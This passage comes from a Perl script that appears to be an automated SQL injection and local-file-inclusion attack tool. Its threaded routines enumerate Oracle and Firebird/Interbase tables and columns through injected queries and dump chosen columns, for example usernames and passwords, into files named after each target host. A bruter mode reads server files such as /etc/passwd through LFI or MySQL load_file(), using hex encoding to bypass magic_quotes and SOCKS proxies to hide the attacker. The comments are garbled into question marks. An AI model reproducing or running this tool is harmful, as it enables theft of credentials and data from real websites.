$thr = $kol_threads; # ???-?? ???????
$num = -1; # ?? ????????
print "-----------------------------------------\n";
print "System information:\n";
print "-----------------------------------------\n";
print FILE "-----------------------------------------\n";
print FILE "HOST: $host\n";
print FILE "-----------------------------------------\n";
print FILE "System information:\n";
print FILE "-----------------------------------------\n";
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
for(0..$thr) {
$trl[$_] = threads->create(\&gets741);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets741 {
$| = 1;
while ($num<$size) {
{ lock($num);
$num++; }
$current = $array[$num];
if ($num == 0) {$mess = 'version: '}
if ($num == 1) {$mess = "user: "}
$content = scan_url();
if ($content =~ m/ussr(.*?)ussr/imgs) {
print $mess . $1 . "\n";
print FILE $mess . $1 . "\n";
}
print $num . "\r";
sleep $pause;
}
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START_o;
}
if ($choice == 2) {
open( FILE, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
$current = $o_sql_start . $o_sql_pref1 . "to_" . $o_convert . "(count(*))" .$o_sql_pref2 . $o_sql_end . $o_plus . "FROM" . $o_plus . 'sys.user_tables' . $o_filtr;
#print FILE $current . "\n";
$content = scan_url();
$tab_num = $content;
$tab_num =~ m/ussr(.*?)ussr/img;
$tab_num = $1; # ???-?? ???????? ? informaion_schema
print "-----------------------------------------\n";
print "Tables in sys.user_tables - $1\n";
print "-----------------------------------------\n";
## start from2 ##
print "Get ALL tables from information_schema ($1) ? (1/0): ";
$choice = <STDIN>;
chomp $choice;
$thr = $kol_threads; # ???-?? ???????
if ($choice == 1) {
$num = 0; # ?? ????????
} else {
print "Enter START_position: ";
$choice1 = <STDIN>;
chomp $choice1;
$num = $choice1-1;
print "Enter END_position: ";
$choice2 = <STDIN>;
chomp $choice2;
$tab_num = $choice2;
print "Dump records from [" . ($num+2) . "] to [" . ($tab_num) . "]\n";
}
print "-----------------------------------------\n";
## end from2
print FILE "-----------------------------------------\n";
print FILE "Tables in sys.user_tables - $1\n";
print FILE "-----------------------------------------\n";
$url12 = $o_sql_start . $o_sql_pref1 . "to_" . $o_convert . "(T.TN)" .$o_sql_pref2 . $o_sql_end . $o_plus . "FROM" . $o_plus . "(SELECT". $o_plus ."ROWNUM". $o_plus ."R,TABLE_NAME". $o_plus ."TN". $o_plus ."FROM". $o_plus ."sys.user_tables)". $o_plus ."T". $o_plus ."WHERE";
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
for(0..$thr) {
$trl[$_] = threads->create(\&gets742);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets742 {
$| = 1;
while ($num<$tab_num) {
{ lock($num);
$num++; }
$current = $url12 . $o_plus . "R=" . $num . $o_filtr;
$content = scan_url();
if ($content =~ m/ussr(.*?)ussr/imgs) {
print $1 . "\n";
print FILE $1 . "\n";
}
print $num . "\r";
sleep $pause;

}
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START_o;
}
if ($choice == 3) {
open( FILE, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
print "-----------------------------------------\n";
print "Enter the table_name: ";
$choice = <STDIN>;
chomp $choice;
print "Table: $choice\n";
print "----------\n";
print FILE "-----------------------------------------\n";
print FILE "Table [ $choice ]\n";
print FILE "-----------------------------------------\n";
$table_name1 = $choice;
$table_name = char_p ($choice);
$current = $o_sql_start . $o_sql_pref1 . "to_" . $o_convert . "(count(*))" .$o_sql_pref2 . $o_sql_end . $o_plus . "FROM" . $o_plus . "sys.user_tab_columns" . $o_plus . "WHERE" . $o_plus . "TABLE_NAME=" . $table_name . $o_filtr;
$content = scan_url();
$content =~ m/ussr(.*?)ussr/img;
$colum_number = $1; # ???-?? ??????? ? ??????????? ?????
print "Number of columns in " . $table_name1 . ": $colum_number\n";
print FILE "Number of columns in " . $table_name1 . ": $colum_number\n";
print "----------\n";
## ?????? ??????? ##
$thr = $kol_threads; # ???-?? ???????
$num = 0; # ????? ???????????
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
$url12 = $o_sql_start . $o_sql_pref1 . "to_" . $o_convert . "(T.TN)" .$o_sql_pref2 . $o_sql_end . $o_plus . "FROM" . $o_plus . "(SELECT". $o_plus ."ROWNUM". $o_plus ."R,COLUMN_NAME". $o_plus ."TN". $o_plus ."FROM". $o_plus ."sys.user_tab_columns". $o_plus ."WHERE". $o_plus ."TABLE_NAME=" . $table_name . ")". $o_plus ."T". $o_plus ."WHERE";
print FILE "Columns in " . $table_name1 . "\n";
for(0..$thr) {
$trl[$_] = threads->create(\&gets743);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets743 {
$| = 1;
while ($num<$colum_number) {
{ lock($num);
$num++; }
$current = $url12 . $o_plus . "R=" . $num . $o_filtr;
$content = scan_url();
if ($content =~ m/ussr(.*?)ussr/imgs) {
print " " . $1 . "\n";
print FILE " " . $1 . "\n";
}
print $num . "\r";
sleep $pause;

}
}
print FILE "----------\n";
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START_o;
}
if ($choice == 4) {
open( FILE, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
print "-----------------------------------------\n";
print "Enter the table_name: ";
$choice = <STDIN>;
chomp $choice;
$table_name = $choice;
$table_name1 = char_p ($choice);
print "Table: $table_name\n";
print "-----------------------------------------\n";
print "Enter the column(s) name(s) - for example - id or id,username,user_password:\n";
$choice = <STDIN>;
chomp $choice;
$column_name1 = $choice;
$column_name = $choice;
@column_spis = split(/,/,$column_name);
$size = @column_spis;
if ($size > 1) {
$column_name = "";
$a = 0;
while ($a < $size) {
if ($a == ($size-1)) {
$column_name .= $column_spis[$a];
} else {
$column_name .= $column_spis[$a] . "||chr(58)||";
}
$a++;
}
}
print FILE "-----------------------------------------\n";
print FILE "Dump column(s): [ " . $column_name1 . " ] from [ " .$table_name . " ]\n";
print FILE "-----------------------------------------\n";
print "Dump column(s): [ " . $column_name1. " ] from [ " .$table_name . " ]\n";
print "-----------------------------------------\n";
## ?????? ???-?? ???????? ?? ??????? #
print "Count data from [ $table_name ]\n";
$current = $o_sql_start . $o_sql_pref1 . "to_" . $o_convert . "(count(*))" .$o_sql_pref2 . $o_sql_end . $o_plus . "FROM" . $o_plus . $table_name . $o_filtr;
$content = scan_url();
$column_name_p = $content;
$column_name_p =~ m/ussr(.*?)ussr/img;
$column_name_p = $1; # ???-?? ???????? ? ??????? ?? ????????? ???????
print "$column_name_p\n";
print "----------\n";
print "Get ALL data from " . $table_name . " (" . $column_name_p . ") ? (1/0): ";
$choice = <STDIN>;
chomp $choice;
$thr = $kol_threads; # ???-?? ???????
if ($choice == 1) {
$num = 1; # ?? ????????
} else {
print "Enter START_position: ";
$choice1 = <STDIN>;
chomp $choice1;
$num = $choice1-1;
print "Enter END_position: ";
$choice2 = <STDIN>;
chomp $choice2;
$column_name_p = $choice2;
print "Dump records from [" . ($num+2) . "] to [" . ($column_name_p) . "]\n";
}
print "-----------------------------------------\n";
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
## ?????? ?????? ?? ??????? ##
$url17 = $o_sql_start . $o_sql_pref1 . "to_" . $o_convert . "(T.TN)" .$o_sql_pref2 . $o_sql_end . $o_plus . "FROM" . $o_plus . "(SELECT". $o_plus ."ROWNUM". $o_plus ."R," . $column_name . $o_plus ."TN". $o_plus ."FROM". $o_plus . $table_name . ")". $o_plus ."T". $o_plus ."WHERE";
for(0..$thr) {
$trl[$_] = threads->create(\&gets744);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets744 {
$| = 1;
while ($num<$column_name_p) {
{ lock($num);
$num++; }
$current = $url17 . $o_plus . "R=" . $num . $o_filtr;
$content = scan_url();
if ($content =~ m/ussr(.*?)ussr/img) {
print " " . $1 . "\n";
print FILE " " . $1 . "\n";
}
print $num . "\r";
sleep $pause;

}
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START_o;
}
if ($choice == 5) {goto START_global}
}
################################################## ################################################## ################
## Firebird/Interbase inj ##
if ($choice == 7) {
START_fi:
if ($fi_source_sql =~ m/^https:\/\/?([^\/]+)/i) {
$host12 = $1;
$https_flag = 1;
print "----------------------\n";
print "HTTPS mode enabled\n";
print "----------------------\n";
}
$host = $host12;
if ($https_mode_auth == 1 && $https_auth_check == 0 && $https_flag == 1) {
print "-----------------------------------------\n";
print "Authorization required, wait please....";
my $answ1 = req($host, $https_auth_script_path, 'POST', $https_auth_post_data, 0);
$ck1 = collect($answ1);
$https_auth_check = 1;
print " DONE\n";
print "-----------------------------------------\n";
}
if ($use_socks == 1 && $socks_check == 0) {
$check_url = $host;
our $query = "GET / HTTP/1.$http_protocol\r\n"
. "Host: $check_host\r\n"
. "Referer: http://" . $check_url . "\r\n"
. "Accept: */*\r\n"
. "User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090716 Ubuntu/9.04 (jaunty) Shiretoko/3.5.1\r\n"
. "Connection: close\r\n\r\n";
print "----------------------------------------\n";
print "You choose mode with SOCKS, try to find good in $socks_file ...\n";
print "Timeout = 5 sec:\n";
print "----------------------------------------\n";
$socks_check = 0;
$check_socks = socks_check();
($current_proxy_host,$current_proxy_port,$socks_ty pe) = split(/:/,$check_socks);
$proxy_message = "$current_proxy_host:$current_proxy_port, SOCKS" . $socks_type;
if ($current_proxy_host) {
$socks_check = 1;
print "Will use --> $proxy_message\n";
} else {
$socks_check = 0;
$proxy_message = "No";
print "No good SOCKS in " . $socks_file . ", change mode. Exit...\n";
}
}
sub char_fi($) {
$str1=$_[0];
$aa="";$bb="";
for ($i = 0; $i<length($str1); $i++ ) {
$aa = ord(substr($str1,$i,1));
if ( $i == 0 ) {$bb= "ascii_char(" . $aa . ")";} else { $bb= $bb. "||ascii_char(" . $aa . ")" ;}
}
return "$bb";
}
print "----------------------------------------------------------\n";
print " Choose mode:\n";
print "----------------------------------------------------------\n";
print " [1] Firebird/Interbase SQL inj system information\n";
print ' [2] Firebird/Interbase SQL inj get tables from rdb$relations (non system)' . "\n";
print " [3] Firebird/Interbase SQL inj get column_name from table\n";
print " [4] Firebird/Interbase SQL inj get data from columns\n";
print " ================================================== =====\n";
print " [5] Main menu\n";
print "----------------------------------------------------------\n";
$choice = <STDIN>;
chomp $choice;
print "Your choice: $choice\n";
if ($choice == 1) {
open( FILE, ">>" . "z_" . $host . ".txt" ); # ???? ??? ?????? ???????????
$url1 = $fi_source_sql . "cast(" . $fi_sql_pref1 . "user" . $fi_sql_pref2 . $fi_plus . "as" . $fi_plus . $fi_convert . ")" . $fi_filtr;
@array = ($url1);
$size = @array; #???????? ?????? ???????
$thr = $kol_threads; # ???-?? ???????
$num = -1; # ?? ????????
print "-----------------------------------------\n";
print "System information:\n";
print "-----------------------------------------\n";
print FILE "-----------------------------------------\n";
print FILE "HOST: $host\n";
print FILE "-----------------------------------------\n";
print FILE "System information:\n";
print FILE "-----------------------------------------\n";
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
for(0..$thr) {
$trl[$_] = threads->create(\&gets6011);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets6011 {
$| = 1;
while ($num<$size) {
{ lock($num);
$num++; }
$current = $array[$num];
if ($num == 0) {$mess = 'user: '}
$content = scan_url();
if ($content =~ m/ussr(.*?)ussr/imgs) {
print $mess . $1 . "\n";
print FILE $mess . $1 . "\n";
}
print $num . "\r";
sleep $pause;
}
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START_fi;
}
if ($choice == 2) {
open( FILE, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
$current = $fi_source_sql . "cast((select" . $fi_plus . $fi_sql_pref1 . 'count(rdb$relation_name)' . $fi_sql_pref2 . $fi_plus . 'from' . $fi_plus . 'rdb$relations' . $fi_plus . 'where' . $fi_plus . 'rdb$system_flag=0)' . $fi_plus . "as" . $fi_plus . $fi_convert . ")" . $fi_filtr;
$content = scan_url();
$tab_num = $content;
$tab_num =~ m/ussr(.*?)ussr/img;
$tab_num = $1; # ???-?? ???????? ? informaion_schema
print "-----------------------------------------\n";
print 'Tables in rdb$relation (non system) - ' . $1 . "\n";
print "-----------------------------------------\n";
## start from2 ##
print 'Get ALL tables from rdb$relation ('. $1 .') ? (1/0): ';
$choice = <STDIN>;
chomp $choice;
$thr = $kol_threads; # ???-?? ???????
if ($choice == 1) {
$num = -1; # ?? ????????
} else {
print "Enter START_position: ";
$choice1 = <STDIN>;
chomp $choice1;
$num = $choice1-1;
print "Enter END_position: ";
$choice2 = <STDIN>;
chomp $choice2;
$tab_num = $choice2;
print "Dump records from [" . ($num+2) . "] to [" . ($tab_num) . "]\n";
}
print "-----------------------------------------\n";
## end from2
print FILE "-----------------------------------------\n";
print FILE 'Tables in rdb$relation - '. $1 . "\n";
print FILE "-----------------------------------------\n";
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
for(0..$thr) {
$trl[$_] = threads->create(\&gets6012);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets6012 {
$| = 1;
while ($num<$tab_num) {
{ lock($num);
$num++; }
$current = $fi_source_sql . "cast((select" . $fi_plus . 'first' . $fi_plus . '1' . $fi_plus . 'skip' . $fi_plus . $num . $fi_plus . 'distinct' . $fi_plus . $fi_sql_pref1 . 'rdb$relation_name' . $fi_sql_pref2 . $fi_plus . 'from' . $fi_plus . 'rdb$relations' . $fi_plus . 'where' . $fi_plus . 'rdb$system_flag=0)' . $fi_plus . "as" . $fi_plus . $fi_convert . ")" . $fi_filtr;
$content = scan_url();
if ($content =~ m/ussr(.*?)ussr/imgs) {
print $1 . "\n";
print FILE $1 . "\n";
}
print $num . "\r";
sleep $pause;

}
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START_fi;
}
if ($choice == 3) {
open( FILE, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
print "-----------------------------------------\n";
print "Enter the table_name: ";
$choice = <STDIN>;
chomp $choice;
print "Table: $choice\n";
print "----------\n";
print FILE "-----------------------------------------\n";
print FILE "Table [ $choice ]\n";
print FILE "-----------------------------------------\n";
$table_name1 = $choice;
$table_name = char_fi ($choice);
$current = $fi_source_sql . "cast((select" . $fi_plus . $fi_sql_pref1 . 'count(rdb$field_name)' . $fi_sql_pref2 . $fi_plus . 'from' . $fi_plus . 'rdb$relation_fields' . $fi_plus . 'where' . $fi_plus . 'rdb$system_flag=0' . $fi_plus . 'and' . $fi_plus . 'rdb$relation_name=' . $table_name . ")" . $fi_plus . "as" . $fi_plus . $fi_convert . ")" . $fi_filtr;
$content = scan_url();
$content =~ m/ussr(.*?)ussr/img;
$colum_number = $1; # ???-?? ??????? ? ??????????? ?????
print "Number of columns in " . $table_name1 . ": $colum_number\n";
print FILE "Number of columns in " . $table_name1 . ": $colum_number\n";
print "----------\n";
## ?????? ??????? ##
$thr = $kol_threads; # ???-?? ???????
$num = -1; # ?? ????????
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
print FILE "Columns in " . $table_name1 . "\n";
for(0..$thr) {
$trl[$_] = threads->create(\&gets6013);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets6013 {
$| = 1;
while ($num<$colum_number) {
{ lock($num);
$num++; }
$current = $fi_source_sql . "cast((select" . $fi_plus . 'first' . $fi_plus . '1' . $fi_plus . 'skip' . $fi_plus . $num . $fi_plus . 'distinct' . $fi_plus . $fi_sql_pref1 . 'rdb$field_name' . $fi_sql_pref2 . $fi_plus . 'from' . $fi_plus . 'rdb$relation_fields' . $fi_plus . 'where' . $fi_plus . 'rdb$system_flag=0' . $fi_plus . 'and' . $fi_plus . 'rdb$relation_name=' . $table_name . ")" . $fi_plus . "as" . $fi_plus . $fi_convert . ")" . $fi_filtr;
$content = scan_url();
if ($content =~ m/ussr(.*?)ussr/imgs) {
print " " . $1 . "\n";
print FILE " " . $1 . "\n";
}
print $num . "\r";
sleep $pause;

}
}
print FILE "----------\n";
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START_fi;
}
if ($choice == 4) {
open( FILE, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
print "-----------------------------------------\n";
print "Enter the table_name: ";
$choice = <STDIN>;
chomp $choice;
$table_name = $choice;
$table_name1 = char_fi ($choice);
print "Table: $table_name\n";
print "-----------------------------------------\n";
print "Enter the column(s) name(s) - for example - id or id,username,user_password:\n";
$choice = <STDIN>;
chomp $choice;
$column_name1 = $choice;
$column_name = $choice;
@column_spis = split(/,/,$column_name);
$size = @column_spis;
if ($size > 1) {
$column_name = "";
$a = 0;
while ($a < $size) {
if ($a == ($size-1)) {
$column_name .= $column_spis[$a];
} else {
$column_name .= $column_spis[$a] . "||ascii_char(58)||";
}
$a++;
}
}
print FILE "-----------------------------------------\n";
print FILE "Dump column(s): [ " . $column_name1 . " ] from [ " .$table_name . " ]\n";
print FILE "-----------------------------------------\n";
print "Dump column(s): [ " . $column_name1. " ] from [ " .$table_name . " ]\n";
print "-----------------------------------------\n";
## ?????? ???-?? ???????? ?? ??????? #
print "Count data from [ $table_name ]\n";
$current = $fi_source_sql . "cast((select" . $fi_plus . $fi_sql_pref1 . 'count(*)' . $fi_sql_pref2 . $fi_plus . 'from' . $fi_plus . $table_name . ")" . $fi_plus . "as" . $fi_plus . $fi_convert . ")" . $fi_filtr;
$content = scan_url();
$column_name_p = $content;
$column_name_p =~ m/ussr(.*?)ussr/img;
$column_name_p = $1; # ???-?? ???????? ? ??????? ?? ????????? ???????
print "$column_name_p\n";
print "----------\n";
print "Get ALL data from " . $table_name . " (" . $column_name_p . ") ? (1/0): ";
$choice = <STDIN>;
chomp $choice;
$thr = $kol_threads; # ???-?? ???????
if ($choice == 1) {
$num = -1; # ?? ????????
} else {
print "Enter START_position: ";
$choice1 = <STDIN>;
chomp $choice1;
$num = $choice1-1;
print "Enter END_position: ";
$choice2 = <STDIN>;
chomp $choice2;
$column_name_p = $choice2;
print "Dump records from [" . ($num+2) . "] to [" . ($column_name_p) . "]\n";
}
print "-----------------------------------------\n";
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
## ?????? ?????? ?? ??????? ##
for(0..$thr) {
$trl[$_] = threads->create(\&gets6014);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets6014 {
$| = 1;
while ($num<$column_name_p) {
{ lock($num);
$num++; }
$current = $fi_source_sql . "cast((select" . $fi_plus . 'first' . $fi_plus . '1' . $fi_plus . 'skip' . $fi_plus . $num . $fi_plus . 'distinct' . $fi_plus . 'cast(' . $fi_plus . $fi_sql_pref1 . $column_name . $fi_sql_pref2 . $fi_plus . 'as' . $fi_plus . 'char(30000))' . $fi_plus . 'from' . $fi_plus . $table_name . ")" . $fi_plus . "as" . $fi_plus . $fi_convert . ")" . $fi_filtr;
$content = scan_url();
if ($content =~ m/ussr(.*?)ussr/img) {
print " " . $1 . "\n";
print FILE " " . $1 . "\n";
}
print $num . "\r";
sleep $pause;

}
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START_fi;
}
if ($choice == 5) {goto START_global}
}
################################################## ################################################## ###############
## LFI/Reader/Load_file() bruter mode ##
if ($choice == 8) {
if ($lrl_url =~ m/^https:\/\/?([^\/]+)/i) {
$host2 = $1;
$https_flag = 1;
print "----------------------\n";
print "HTTPS mode enabled\n";
print "----------------------\n";
}
$host = $host2;
if ($https_mode_auth == 1 && $https_auth_check == 0 && $https_flag == 1) {
print "-----------------------------------------\n";
print "Authorization required, wait please....";
my $answ1 = req($host, $https_auth_script_path, 'POST', $https_auth_post_data, 0);
$ck1 = collect($answ1);
$https_auth_check = 1;
print " DONE\n";
print "-----------------------------------------\n";
}
if ($use_socks == 1 && $socks_check == 0) {
$check_url = $host;
our $query = "GET / HTTP/1.$http_protocol\r\n"
. "Host: $check_host\r\n"
. "Referer: http://" . $check_url . "\r\n"
. "Accept: */*\r\n"
. "User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090716 Ubuntu/9.04 (jaunty) Shiretoko/3.5.1\r\n"
. "Connection: close\r\n\r\n";
print "----------------------------------------\n";
print "You choose mode with SOCKS, try to find good in $socks_file ...\n";
print "Timeout = 5 sec:\n";
print "----------------------------------------\n";
$socks_check = 0;
$check_socks = socks_check();
($current_proxy_host,$current_proxy_port,$socks_ty pe) = split(/:/,$check_socks);
$proxy_message = "$current_proxy_host:$current_proxy_port, SOCKS" . $socks_type;
if ($current_proxy_host) {
$socks_check = 1;
print "Will use --> $proxy_message\n";
} else {
$socks_check = 0;
$proxy_message = "No";
print "No good SOCKS in " . $socks_file . ", change mode. Exit...\n";
}
}
sub ascii_to_hex ($) {
(my $str = shift) =~ s/(.|\n)/sprintf("%02lx", ord $1)/eg;
$str = "0x" . $str;
return $str;
}
use LWP::Simple;
open(FILE, "<", $lrl_list);
while(<FILE>) {
chomp;
push(@lrl_error, $_);
}
close(FILE);
$size = 0;
$size = @lrl_error;
$size = $size -1;
START3:
print "----------------------------------------------------------------------------\n";
print " LFI/Reader/Load_file() bruter mode\n";
print "----------------------------------------------------------------------------\n";
print " [1] LFI/Reader - visual error when wrong query\n";
print " [2] LFI/Reader - unvisual error when wrong query\n";
print " [3] Mysql load_file - visual error when wrong query, magic_quotes=OFF\n";
print " [4] Mysql load_file - unvisual error when wrong query, magic_quotes=OFF\n";
print " [5] Mysql load_file - visual error when wrong query, magic_quotes=ON\n";
print " [6] Mysql load_file - unvisual error when wrong query, magic_quotes=ON\n";
print " [7] Main menu\n";
print "----------------------------------\n";
$choice = <STDIN>;
chomp $choice;
if ($choice == 1 || $choice == 3){
print "scan URL: $lrl_url\n";
print "----------------------\n";
print " [1] Start brute\n";
print " [2] Main menu\n";
print "----------------------\n";
$choice1 = <STDIN>;
chomp $choice1;
if ($choice1 == 1) {
open( FILE1, ">>" . "z_" .$host2 . ".txt" ); # ???? ??? ?????? ???????????
open( FILE2, ">>" . "z_" .$host2 . "_CONTENT.txt" ); # ???? ??? ?????? ???????????
print FILE1 "-------------------------------------------------------\n";
print FILE1 "LFI/Reader/Load_file() - visual error when wrong query\n";
print FILE1 "-------------------------------------------------------\n";
print "File: $lrl_list\n";
print "Records: $size\n\n";
print "----------------------\n";
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
$thr = $kol_threads; # ???-?? ???????
$num = -1; # ?? ????????
for(0..$thr) {
$trl[$_] = threads->create(\&gets10);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets10 {
$| = 1;
while ($num<$size) {
{ lock($num);
$num++; }
$current1 = $lrl_error[$num];
$uri = $lrl_start . $current1 . $lrl_end;
$current = $uri;
$host = $host2;
$content = scan_url();
$lrl_flag = 1;
if($content =~ m/$lrl_error_message/img || $content =~ m/Bad Request/img || $content =~ m/Parse error/img) {
$lrl_flag = 0;
}
if ($lrl_flag == 1) {
print " ---> /" . $current1 . "\n";
print FILE1 " " . $current . "\n";
print FILE2 "\n\n\n====================================\n";
print FILE2 " /" . $current1 . "\n";
print FILE2 "====================================\n";
print FILE2 $content . "\n";
}
print $num . "\r";
sleep $pause;
}
}
print "-------------------------------------------------------------------------------\n";
print "Saved in " . "z_" . $host2 . ".txt and CONTENT in z_" . $host2 . "_CONTENT.txt\n";
close(FILE1);
close(FILE2);
goto START3;
}
}
if ($choice == 2 || $choice == 4){
print "scan URL: $lrl_url\n";
print "----------------------\n";
print " [1] Start brute\n";
print " [2] Main menu\n";
print "----------------------\n";
$choice = <STDIN>;
chomp $choice;
if ($choice == 1) {
open( FILE1, ">>" . "z_" .$host2 . ".txt" ); # ???? ??? ?????? ???????????
open( FILE2, ">>" . "z_" .$host2 . "_CONTENT.txt" ); # ???? ??? ?????? ???????????
print FILE1 "-------------------------------------------------------\n";
print FILE1 "LFI/Reader/Load_file() - unvisual error when wrong query\n";
print FILE1 "-------------------------------------------------------\n";
print "File: $lrl_list\n";
print "Records: $size\n\n";
print "----------------------\n";
print "ONLY GET METHOD FOR THIS MODE!!! NO PROXY!!!! Continue ? (1/0): \n";
$choice = <STDIN>;
chomp $choice;
if ($choice == 1) {
print "----------------------\n";
print "Get wrong URL, wait please...";
$space = "";
$wrong_test = "etc/passwd1";
$urii = $lrl_start . $wrong_test . $lrl_end;
$current = $urii;
$content = get($urii);
sleep 1;
$content =~ s/$wrong_test/$space/egimosx;
$wrong_url_length = length($content);
print "OK\n";
print "----------------------\n";
$thr = $kol_threads; # ???-?? ???????
$num = -1; # ?? ????????
for(0..$thr) {
$trl[$_] = threads->create(\&gets11);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets11 {
$| = 1;
while ($num<$size) {
{ lock($num);
$num++; }
$current1 = $lrl_error[$num];
$uri = $lrl_start . $current1 . $lrl_end;
$current = $uri;
$content = get($uri);
$content =~ s/$current1/$space/egimosx;
$content_length = length($content);
$lrl_flag = 1;
if($content_length == $wrong_url_length || $content =~ m/Bad Request/img || $content =~ m/Parse error/img) {
$lrl_flag = 0;
}
if ($lrl_flag == 1) {
print " ---> /" . $current1 . "\n";
print FILE1 " " . $current . "\n";
print FILE2 "\n\n\n====================================\n";
print FILE2 " /" . $current1 . "\n";
print FILE2 "====================================\n";
print FILE2 $content . "\n";
}
print $num . "\r";
sleep $pause;
}
}
print "-------------------------------------------------------------------------------\n";
print "Saved in " . "z_" . $host2 . ".txt and CONTENT in z_" . $host2 . "_CONTENT.txt\n";
close(FILE1);
close(FILE2);
goto START3;
}
if ($choice == 0) {
close(FILE1);
close(FILE2);
goto START3;
}
}
}
if ($choice == 6){
print "scan URL: $lrl_url\n";
print "----------------------\n";
print " [1] Start brute\n";
print " [2] Main menu\n";
print "----------------------\n";
$choice = <STDIN>;
chomp $choice;
if ($choice == 1) {
open( FILE1, ">>" . "z_" .$host2 . ".txt" ); # ???? ??? ?????? ???????????
open( FILE2, ">>" . "z_" .$host2 . "_CONTENT.txt" ); # ???? ??? ?????? ???????????
print FILE1 "-------------------------------------------------------\n";
print FILE1 "LFI/Reader/Load_file() - unvisual error when wrong query\n";
print FILE1 "-------------------------------------------------------\n";
print "File: $lrl_list\n";
print "Records: $size\n\n";
print "----------------------\n";
print "ONLY GET METHOD FOR THIS MODE!!! NO PROXY!!!! Continue ? (1/0): \n";
$choice = <STDIN>;
chomp $choice;
if ($choice == 1) {
print "----------------------\n";
print "Get wrong URL, wait please...";
$space = "";
$wrong_test1 = "/etc/passwd1";
$wrong_test = ascii_to_hex $wrong_test1;
$urii = $lrl_start . $wrong_test . $lrl_end;
$current = $urii;
$content = get($urii);
sleep 1;
$content =~ s/$wrong_test/$space/egimosx;
$wrong_url_length = length($content);
print "OK\n";
print "----------------------\n";
$thr = $kol_threads; # ???-?? ???????
$num = -1; # ?? ????????
for(0..$thr) {
$trl[$_] = threads->create(\&gets12);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets12 {
$| = 1;
while ($num<$size) {
{ lock($num);
$num++; }
$current2 = "/" . $lrl_error[$num];
$current1 = ascii_to_hex $current2;
$uri = $lrl_start . $current1 . $lrl_end;
$current = $uri;
$content = get($uri);
$content =~ s/$current1/$space/egimosx;
$content_length = length($content);
$lrl_flag = 1;
if($content_length == $wrong_url_length || $content =~ m/Bad Request/img || $content =~ m/Parse error/img) {
$lrl_flag = 0;
}
if ($lrl_flag == 1) {
print " ---> " . $current2 . "\n";
print FILE1 "------------------------------------\n";
print FILE1 " $current2\n";
print FILE1 "------------------------------------\n";
print FILE1 " " . $current . "\n";
print FILE2 "\n\n\n====================================\n";
print FILE2 " /" . $current2 . "\n";
print FILE2 "====================================\n";
print FILE2 $content . "\n";
}
print $num . "\r";
sleep $pause;
}
}
print "-------------------------------------------------------------------------------\n";
print "Saved in " . "z_" . $host2 . ".txt and CONTENT in z_" . $host2 . "_CONTENT.txt\n";
close(FILE1);
close(FILE2);
goto START3;
}
if ($choice == 0) {
close(FILE1);
close(FILE2);
goto START3;
}
}
}
if ($choice == 5){
print "scan URL: $lrl_url\n";
print "----------------------\n";
print " [1] Start brute\n";
print " [2] Main menu\n";
print "----------------------\n";
$choice1 = <STDIN>;
chomp $choice1;
if ($choice1 == 1) {
open( FILE1, ">>" . "z_" .$host2 . ".txt" ); # ???? ??? ?????? ???????????
open( FILE2, ">>" . "z_" .$host2 . "_CONTENT.txt" ); # ???? ??? ?????? ???????????
print FILE1 "-------------------------------------------------------\n";
print FILE1 "LFI/Reader/Load_file() - visual error when wrong query\n";
print FILE1 "-------------------------------------------------------\n";
print "File: $lrl_list\n";
print "Records: $size\n\n";
print "----------------------\n";
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
$thr = $kol_threads; # ???-?? ???????
$num = -1; # ?? ????????
for(0..$thr) {
$trl[$_] = threads->create(\&gets13);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets13 {
$| = 1;
while ($num<$size) {
{ lock($num);
$num++; }
$current2 = "/" . $lrl_error[$num];
$current1 = ascii_to_hex $current2;
$uri = $lrl_start . $current1 . $lrl_end;
$current = $uri;
$current_log = $lrl_start . $current2 . $lrl_end;
